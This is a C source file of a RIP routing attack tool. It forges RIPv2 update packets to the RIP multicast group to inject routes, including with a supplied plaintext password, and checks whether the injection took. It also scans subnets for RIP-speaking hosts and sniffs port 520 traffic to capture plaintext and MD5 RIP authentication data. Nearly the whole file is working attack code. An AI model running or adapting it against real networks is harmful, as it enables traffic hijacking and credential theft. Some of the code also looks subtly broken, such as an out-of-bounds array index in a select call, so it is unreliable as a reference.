#include "fibc.h"
#include "flags.h"

int offset_dl;
pcap_t *handle;

#define CASE(x,y) {	\
	case (x):	\
	offset_dl=(y);	\
	break;}

int
sizeof_datalink (pcap_t * pd)
{
  int dtl;

  if ((dtl = pcap_datalink (pd)) < 0)
    fatal ("no datalink info: %s", pcap_geterr (pd));

  switch (dtl)
    {
      CASE (AP_DLT_NULL, 4);
      CASE (AP_DLT_EN10MB, 14);
      CASE (AP_DLT_EN3MB, 14);
      CASE (AP_DLT_AX25, -1);
      CASE (AP_DLT_PRONET, -1);
      CASE (AP_DLT_CHAOS, -1);
      CASE (AP_DLT_IEEE802, 22);
      CASE (AP_DLT_ARCNET, -1);
#if defined (__FreeBSD__) || defined (__OpenBSD__) || defined (__NetBSD__) || defined (__BSDI__)
      CASE (AP_DLT_SLIP, 16);
#else
      CASE (AP_DLT_SLIP, 24);
#endif

#if defined (__FreeBSD__) || defined (__OpenBSD__) || defined (__NetBSD__)
      CASE (AP_DLT_PPP, 4);
#elif defined (__sun)
      CASE (AP_DLT_PPP, 8);
#else
      CASE (AP_DLT_PPP, 24);
#endif
      CASE (AP_DLT_FDDI, 21);
      CASE (AP_DLT_ATM_RFC1483, 8);

      CASE (AP_DLT_LOOP, 4);	/* according to OpenBSD DLT_LOOP
				   * collision: see "bpf.h" */
      CASE (AP_DLT_RAW, 0);

      CASE (AP_DLT_SLIP_BSDOS, 16);
      CASE (AP_DLT_PPP_BSDOS, 4);
      CASE (AP_DLT_ATM_CLIP, -1);
#if defined (__FreeBSD__) || defined (__OpenBSD__) || defined (__NetBSD__)
      CASE (AP_DLT_PPP_SERIAL, 4);
      CASE (AP_DLT_PPP_ETHER, 4);
#elif defined (__sun)
      CASE (AP_DLT_PPP_SERIAL, 8);
      CASE (AP_DLT_PPP_ETHER, 8);
#else
      CASE (AP_DLT_PPP_SERIAL, 24);
      CASE (AP_DLT_PPP_ETHER, 24);
#endif
      CASE (AP_DLT_C_HDLC, -1);
      CASE (AP_DLT_IEEE802_11, 30);
      CASE (AP_DLT_LINUX_SLL, 16);
      CASE (AP_DLT_LTALK, -1);
      CASE (AP_DLT_ECONET, -1);
      CASE (AP_DLT_IPFILTER, -1);
      CASE (AP_DLT_PFLOG, -1);
      CASE (AP_DLT_CISCO_IOS, -1);
      CASE (AP_DLT_PRISM_HEADER, -1);
      CASE (AP_DLT_AIRONET_HEADER, -1);
    default:
      fatal ("unknown datalink type DTL_?=%d", dtl);
      break;
    }

  return offset_dl;
}


void
fatal (char *pattern, ...)
{
  va_list ap;
  va_start (ap, pattern);
  vfprintf (stderr, pattern, ap);
  va_end (ap);
  exit (1);
}

char *
in_ntoa (unsigned long in)
{
  static char buff[18];
  char *p;

  p = (char *) &in;
  sprintf (buff, "%d.%d.%d.%d",
	   (p[0] & 255), (p[1] & 255), (p[2] & 255), (p[3] & 255));
  return (buff);
}

unsigned short
in_cksum (unsigned short *buh, int len)
{
  long sum = 0;
  unsigned short oddbyte;
  unsigned short answer;

  while (len > 1)
    {
      sum += *buh++;
      len -= 2;
    }

  if (len == 1)
    {
      oddbyte = 0;
      *((unsigned char *) &oddbyte) = *(unsigned char *) buh;
      sum += oddbyte;
    }
  sum = (sum >> 16) + (sum & 0xFFFF);
  sum += (sum >> 16);
  answer = ~sum;
  return answer;
}

void
init_all ()
{
  if (geteuid ())
    {
      fprintf (stderr, "You must be root to run this tool\n");
      exit (1);
    }
  if ((dev = pcap_lookupdev (errbuf)) == NULL)
    fatal (" pcap_lookupdev: %s\n\n", errbuf);
  if (pcap_lookupnet
      (dev, (bpf_u_int32 *) & localnet, (u_int *) & routes[1][0], errbuf) < 0)
    fatal (" pcap_lookupnet: %s\n\n", errbuf);
  localaddr = libnet_get_ipaddr4 ((libnet_t *) dev);
  routes[3][0] = htonl (1);
  w = 1;
  strncpy(rip_group, "224.0.0.9", 9);
}

void
send_fake_rip_response ()
{
  libnet_t *l;
  libnet_ptag_t udp;
  libnet_ptag_t ip;
  struct rip *pack;
  struct rip_message *entries;
  char errbuf[LIBNET_ERRBUF_SIZE];
  u_char buffer[504];
  int i;
  
  bzero (buffer, 504);

  pack = (struct rip *) (buffer);
  entries = (struct rip_message *) (buffer + sizeof (struct rip));

  pack->command = 2;
  pack->version = 2;

  for (i = 0; i < w; i++)
    {
      entries->family = htons (2);
      entries->tag = 0;
      entries->ip = routes[0][i];
      entries->netmask = routes[1][i];
      entries->gateway = routes[2][i];
      entries->metric = routes[3][i];
      entries++;
    }

  l = libnet_init (LIBNET_RAW4, dev, errbuf);

  udp =
    libnet_build_udp (RIP_PORT, RIP_PORT,
		      LIBNET_UDP_H + sizeof (struct rip) +
		      sizeof (struct rip_message) * w , 0, buffer,
		      sizeof (struct rip) + sizeof (struct rip_message) * w,
		      l, 0);

  ip =
    libnet_build_ipv4 (LIBNET_IPV4_H + LIBNET_UDP_H + sizeof (struct rip) +
		       sizeof (struct rip_message) * w, 0,
		       3000 + (rand () % 100), 0, 64, IPPROTO_UDP, 0,
		       localaddr, inet_addr (rip_group), NULL, 0, l, 0);

  if (libnet_toggle_checksum (l, udp, 1) < 0)
    {
      if(graph)
	{
	  endwin();
	}
    fatal ("libnet_toggle_checksum: %s\n\n", libnet_geterror (l));
    }

  while (1)
    {
      if ((libnet_write (l)) < 0)
	{
	  if(graph)
	    {
	      endwin();
	    }
	  fatal ("libnet_write(): %s\n\n", libnet_geterror (l));
	}
      sleep (30);
    }

}

void
check_injection ()
{
  char buffer[BUFLEN], buffer_pkt[504];
  int sock, letti, i;
  struct rip *rip_head;
  struct rip_message *rippo, *entries;
  struct sockaddr_in peer;

  rip_head = (struct rip *) (buffer_pkt);
  entries = (struct rip_message *) (buffer_pkt + sizeof (struct rip));

  rip_head->command = 1;
  rip_head->version = 2;

  for (i = 0; i < w; i++)
    {
      entries->family = htons (2);
      entries->tag = 0;
      entries->ip = routes[0][i];
      entries->netmask = routes[1][i];
      entries->gateway = routes[2][i];
      entries->metric = routes[3][i];
      entries++;
    }

  peer.sin_family = AF_INET;
  peer.sin_addr.s_addr = inet_addr (rip_group);
  peer.sin_port = htons (RIP_PORT);

  if ((sock = socket (AF_INET, SOCK_DGRAM, 0)) < 0)
    {
      if(graph)
	{
	  endwin();
	}
    fatal (" failed to create socket: %s\n\n", strerror (errno));
    }
  fcntl (sock, F_SETFL, O_NONBLOCK);

  sleep (5);

  while (1)
    {
      rippo = (struct rip_message *) (buffer + 4);
      if (sendto
	  (sock, buffer_pkt,
	   sizeof (struct rip) + sizeof (struct rip_message) * w, 0,
	   (struct sockaddr *) &peer, sizeof (peer)) < 0)
	{
	  if (graph)
	    {
	      endwin();
	    }
	fatal ("  failed to send packets: %s\n\n", strerror (errno));
	}
      sleep (1);
      if ((letti = recvfrom (sock, buffer, BUFLEN, 0, NULL, NULL)) < 0)
	n_print ("princ",1,3,"\nNo Response (try -x)\n");
       

      for (i = 0; i < w; i++)
	{
	  for (; (u_long) * (&rippo) < (u_long) (&buffer) + letti; rippo++)
	    {
	      if (rippo->ip == routes[0][i])
		{
		  if (ntohl (rippo->metric) == ntohl (routes[3][i]) + 1)
		    {
		      n_print ("princ",1,2,"\nRoute %s: Injected Correctly\n",
			      in_ntoa (rippo->ip));
		      
		      if(!graph)
			fflush (stdout); 
		      
		      break;
		    }
		  else
		    {
		      n_print ("princ",1,2,"\nRoute %s: Injection Failed ", in_ntoa(rippo->ip)); 
		      n_print ("princ",2,2,"(netmask: %s, ", in_ntoa(rippo->netmask));
		      n_print ("princ",3,2,"gw: %s, metric: %u)\n", in_ntoa(rippo->gateway), ntohl(rippo->metric));

		      if(!graph)
			fflush (stdout); 
		      
		      break;
		    }
		}
	    }
	}
      bzero (&buffer, sizeof (buffer));
      sleep (30);
    }
}

void
pack_handler (char *packet, int readlen, unsigned long ip)
{
  struct rip_message *rip_head;

  rip_head = (struct rip_message *) (packet + 4);
printf("packet handler\n");
  n_print ("princ",1,2," HOST %s SPEAKS RIPv%i!!\n", in_ntoa(htonl(ip)),
	  *(packet + 1));

  n_print ("princ",1,2," *-*-*-*-*-*-*-*-*-*-*-*-*\n");
  for (; (u_long) * (&rip_head) < (u_long) (packet) + readlen; rip_head++)
    {
      n_print ("princ",2,2,"   |-- IP: %s\n", in_ntoa (rip_head->ip));
      n_print ("princ",3,2,"   |------ Metric: %u\n", ntohl (rip_head->metric));
      n_print ("princ",4,2,"   |------ Netmask: %s\n", in_ntoa (rip_head->netmask));
      n_print ("princ",5,2,"   |------ Next Hop: %s\n", in_ntoa (rip_head->gateway));
      n_print ("princ",6,2,"   |------ Tag: %u\n", rip_head->tag);
      n_print ("princ",7,2,"   |------ Family: %u\n\n", htons (rip_head->family));
    }
}

int
scan_net (char *net)
{
  char *prefix;
  int sock[0xff], readlen;
  unsigned long i, j;
  unsigned long start, end;
  struct {
      struct rip rip_head;
      struct rip_message entry;
  } rip_scan;
  struct sockaddr_in peers;
  fd_set rfd;
  struct timeval tv;
  char buffer[BUFLEN];

  peers.sin_family = AF_INET;
  peers.sin_port = htons (RIP_PORT);

  if ((prefix = memchr (net, '/', strlen (net))) == NULL) {
      if(graph) {
	  n_print("princ",1,2,"You must use the subnet/prefix format!!!");
	  return (0);
      } else
	fatal(" You must use the subnet/prefix format!!!\n Example: 192.168.0.0/24 format!!!\n\n");
  }
  
  *(prefix) = '\0';
  start = inet_network (net);
  end = start + (1 << (32 - atoi (++prefix)));

  bzero (&rip_scan, sizeof (rip_scan));

  rip_scan.rip_head.command = 1;
  rip_scan.rip_head.version = 2;
  rip_scan.entry.metric = htonl (16);

  tv.tv_sec = 5;
  tv.tv_usec = 0;
  
  while(1) {
  	FD_ZERO(&rfd);

	for (i = 0; (start+i < end) && (i < 0xff); i++) {
                if (((start+i) & 0xff) == 0xff)
			continue;
		if(!((start+i) & 0xff))
			continue;
		if ((sock[i] = socket (AF_INET, SOCK_DGRAM, 0)) < 0)
			fatal("unable to create socket\n");
		FD_SET(sock[i], &rfd);
  	}
	printf("Sending Packets: ");
	for (i = 0; (start+i < end) && (i < 0xff); i++) {
                if (((start+i) & 0xff) == 0xff)
        		continue;        
		if(!((start+i) & 0xff))
                	continue;
		peers.sin_addr.s_addr = htonl (start+i);
		if (sendto (sock[i], &rip_scan, sizeof (rip_scan), 0, (struct sockaddr *) &peers, sizeof (peers)) < 0)
			printf("error sending frame to %s\n", in_ntoa(peers.sin_addr.s_addr));
	}
	printf(" Packets From %s to ", in_ntoa(htonl(start)));
	printf(" %s Sent!\n", in_ntoa(htonl(start+i))); 
	printf("Now Listening..\n");
	fflush(stdout);
	if ((j = select(sock[0xff]+1, &rfd, NULL, NULL, &tv)) > 0) { 
		for (i = 0; (start+i < end) && (i < 0xff) && (j != 0); i++) {
			if (((start+i) & 0xff) == 0xff)
	                        continue;
	                if(!((start+i) & 0xff))
	                        continue;
			if (FD_ISSET(sock[i], &rfd)) {
				memset(buffer, 0, BUFLEN);
				printf("%s\n", in_ntoa(htonl(start+i)));
				if ((readlen = read(sock[i], buffer, BUFLEN)) > 0) {
					pack_handler(buffer, readlen, start+i);
					j--;
				}
			}
		}
	}
	for (i = 0; (start+i < end) && (i < 0xff); i++)
		close(sock[i]);
	if ((start+=0x100) >= end) break; 
  }

  return 0;
}

void
rip_file_read (char *filez)
{
  FILE *OPENF;
  int i;

  if ((OPENF = fopen (filez, "r+")) == NULL)
    {
      if(graph)
	{
	  endwin();
	  printf("\n**%sRember that if you want to read from the default file you have to type NULL in the pop_up%s**\n\n",BOLD,NORMAL);
	}
    fatal ("Unable to open %s.\n", filez);
    }
  fscanf (OPENF, "%u\n", &w);

  if (w > 25)
    {
      if(graph)
	{
	  endwin();
	}
    fatal ("%s corrupted\n\n", filez);
    }
  for (i = 1; i <= w; i++)
    {
      fscanf (OPENF, "%u %u %u %u\n", &routes[0][i-1], &routes[1][i-1],
	      &routes[2][i-1], &routes[3][i-1]);
      n_print ("princ",i,2,"Read: Route: %s Metric: %u", in_ntoa (routes[0][i-1]),
	       ntohl (routes[3][i-1]));
      
    }

  fclose (OPENF);
}

void
pack_handler_sniff (u_char * args, const struct pcap_pkthdr *header,
		    const u_char * packet)
{
  struct authentication *auth;
#ifdef __Linux__
  auth =
    (struct authentication *) (packet + sizeof_datalink (handle) +
			       sizeof (struct iphdr) +
			       sizeof (struct udphdr) + sizeof (struct rip));

#endif /*Linux*/

#ifdef __OpenBSD__
  auth =
    (struct authentication *) (packet + sizeof_datalink (handle) +
			       sizeof (struct ip) +
			       sizeof (struct udphdr) + sizeof (struct rip));

#endif /*OpenBSD*/

  n_print ("winfo",1,2,"Packet Examined... ");

  if ((auth->flag == 0xFFFF) && (auth->auth_type == htons (2)))
    n_print ("winfo",2,2,"password found == %s\n", auth->passwd);
  else if ((auth->flag == 0xFFFF) && (auth->auth_type == htons (3))) {
    unsigned char *ptr;
    unsigned short *length;
    length = (unsigned short *)auth;
    length+=2;
    ptr = (unsigned char *)auth;
    ptr+=8;
    n_print ("winfo",1,2,"MD5 password found\n");
    n_print ("winfo",2,2,"Sequence Number: %x %x %x %x\n", *ptr, *(ptr+1), *(ptr+2), *(ptr+3));
    ptr+=htons(*length);
    ptr-=8;
    n_print ("winfo",3,2,"Authentication Data: %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x\n\n", *ptr, *(ptr+1), *(ptr+2), *(ptr+3), *(ptr+4), *(ptr+5), *(ptr+6), *(ptr+7), *(ptr+8), *(ptr+9), *(ptr+10), *(ptr+11), *(ptr+12), *(ptr+13), *(ptr+14), *(ptr+15)); 
    
    if(!graph)    
      fflush(stdout);
    
  }
  else n_print ("winfo",2,2,"and there is no authentication header\n");
}

void
sniff_passwd ()
{
  struct bpf_program filter;
  char *filter_app = "udp src port 520";

  handle = pcap_open_live (dev, BUFSIZ, 1, -1, errbuf);
  if (pcap_compile (handle, &filter, filter_app, 0, 0) < 0)
    {
      if(graph)
	{
	endwin();
	}
    fatal (" pcap_compile: %s\n\n", pcap_geterr (handle));
    }
  pcap_setfilter (handle, &filter);
  pcap_loop (handle, -1, pack_handler_sniff, NULL);
}

void
auth_pass ()
{
  libnet_t *l;
  libnet_ptag_t udp;
  libnet_ptag_t ip;
  struct rip *pack;
  struct authentication *auth;
  struct rip_message *entries;
  char errbuf[LIBNET_ERRBUF_SIZE];
  unsigned char buffer[504];
  int i;

  pack = (struct rip *) (buffer);
  auth = (struct authentication *) (buffer + sizeof (struct rip));
  entries =
    (struct rip_message *) (buffer + sizeof (struct rip) +
			    sizeof (struct authentication));

  pack->command = 2;
  pack->version = 2;

  auth->flag = 0xFFFF;
  auth->auth_type = htons (2);
  strncpy (auth->passwd, password, 16);

  if (w == 25)
    w--;

  for (i = 0; i < w; i++)
    {
      entries->family = htons (2);
      entries->tag = 0;
      entries->ip = routes[0][i];
      entries->netmask = routes[1][i];
      entries->gateway = routes[2][i];
      entries->metric = routes[3][i];
      entries++;
    }

  l = libnet_init (LIBNET_RAW4, dev, errbuf);

  udp = libnet_build_udp (RIP_PORT,
			  RIP_PORT,
			  LIBNET_UDP_H + sizeof (struct rip) +
			  sizeof (struct authentication) +
			  sizeof (struct rip_message) * w, 0, buffer,
			  sizeof (struct rip) +
			  sizeof (struct authentication) +
			  sizeof (struct rip_message) * w , l, 0);

  ip = libnet_build_ipv4 (LIBNET_IPV4_H + LIBNET_UDP_H + sizeof (struct rip) +
			  sizeof (struct authentication) +
			  sizeof (struct rip_message) * w ,
			  0,
			  3000 + (rand () % 100),
			  0,
			  64,
			  IPPROTO_UDP,
			  0, localaddr, inet_addr (rip_group), NULL, 0, l, 0);

  if (libnet_toggle_checksum (l, udp, 1) < 0)
    {
      if(graph)
	endwin();

    fatal ("error: %s\n\n", libnet_geterror (l));
    }
  while (1)
    {
      if ((libnet_write (l)) < 0)
	{
	  if(graph)
	    endwin();

	fatal ("libnet_write(): %s\n\n", libnet_geterror (l));
	}
      sleep (30);
    }
}

void
check_injection_crypt ()
{
  char buffer[BUFLEN], buffer_pkt[504];
  int sock, letti, i;
  struct rip *rip_head;
  struct authentication *auth;
  struct rip_message *rippo, *entries;
  struct sockaddr_in peer;

  rip_head = (struct rip *) (buffer_pkt);
  auth = (struct authentication *) (buffer_pkt + sizeof (struct rip));
  entries =
    (struct rip_message *) (buffer_pkt + sizeof (struct rip) +
			    sizeof (struct authentication));

  rip_head->command = 1;
  rip_head->version = 2;

  auth->flag = 0xFFFF;
  auth->auth_type = htons (2);
  strncpy (auth->passwd, password, 16);

  if (w == 25)
    w--;

  for (i = 0; i < w; i++)
    {
      entries->family = htons (2);
      entries->tag = 0;
      entries->ip = routes[0][i];
      entries->netmask = routes[1][i];
      entries->gateway = routes[2][i];
      entries->metric = routes[3][i];
      entries++;
    }

  peer.sin_family = AF_INET;
  peer.sin_addr.s_addr = inet_addr (rip_group);
  peer.sin_port = htons (RIP_PORT);

  if ((sock = socket (AF_INET, SOCK_DGRAM, 0)) < 0)
    {
      if(graph)
	endwin();

    fatal (" failed to create socket: %s\n\n", strerror (errno));
    }
  fcntl (sock, F_SETFL, O_NONBLOCK);

  sleep (5);

  while (1)
    {
      rippo = (struct rip_message *) (buffer + 4);
      if (sendto
	  (sock, buffer_pkt,
	   sizeof (struct rip) + sizeof (struct rip_message) * (w + 1), 0,
	   (struct sockaddr *) &peer, sizeof (peer)) < 0)
	{
	  if(graph)
	    endwin();

	fatal ("  failed to send packets: %s\n\n", strerror (errno));
	}
      sleep (1);
      if ((letti = recvfrom (sock, buffer, BUFLEN, 0, NULL, NULL)) < 0)
	n_print ("princ",1,2,"\nNo Response (try -x)\n");

      for (i = 0; i < w; i++)
	{
	  for (; (u_long) * (&rippo) < (u_long) (&buffer) + letti; rippo++)
	    {
	      if (rippo->ip == routes[0][i])
		{
		  if (ntohl (rippo->metric) == ntohl (routes[3][i]) + 1)
		    {
		      n_print ("princ",2,2,"\nRoute %s: Injected Correctly\n",
			      in_ntoa (rippo->ip));
		      
		      if(!graph)		      
			fflush (stdout); 
		     
		      break;
		    }
		  else
		    {
		      n_print ("princ",4,2,"\nRoute %s: Injection Failed ", in_ntoa (rippo->ip));
		      n_print ("princ",5,2,"(netmask: %s, ", in_ntoa(rippo->netmask));
		      n_print ("princ",6,2,"gw: %s, metric: %u)\n", in_ntoa(rippo->gateway), ntohl(rippo->metric)); 
		      if(!graph)
			fflush (stdout); 
		      
		      break;
		    }
		}
	    }
	}
      bzero (&buffer, sizeof (buffer));
      sleep (30);
    }
}
 
void n_print(char *wins, int y, int x, char *string, ...)
  {
  char msg[400];
  int n;
  va_list ap;

	va_start(ap, string);
	n = vsnprintf(msg, 400, string, ap);
	va_end(ap);
      
    if(!graph)
    	fprintf(stdout,"%s",msg);
	
    if(graph)
        ng_print(wins,y,x,msg);
  }
